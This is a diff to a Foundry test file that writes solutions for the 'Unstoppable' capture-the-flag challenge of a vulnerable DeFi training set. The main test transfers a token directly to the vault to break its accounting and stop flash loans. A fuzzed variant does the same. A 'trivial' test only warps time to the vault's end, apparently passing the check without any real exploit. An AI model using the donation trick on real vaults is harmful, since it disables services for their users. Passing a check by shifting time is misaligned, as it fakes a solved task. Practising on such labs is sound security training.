@@ -18,6 +18,8 @@ contract UnstoppableChallenge is Test {
     UnstoppableVault public vault;
     UnstoppableMonitor public monitorContract;
 
+    uint256 startTime;
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -29,6 +31,7 @@ contract UnstoppableChallenge is Test {
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
     function setUp() public {
+        startTime = block.timestamp;
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
@@ -91,7 +94,16 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault), 1);
+    }
+
+    function test_unstoppable_fuzz(uint256 amt) public checkSolvedByPlayer {
+        vm.assume(amt > 0 && amt <= INITIAL_PLAYER_TOKEN_BALANCE);
+        token.transfer(address(vault), amt);
+    }
+
+    function test_unstoppable_trivial() public checkSolvedByPlayer {
+        vm.warp(vault.end());
     }
 
     /**
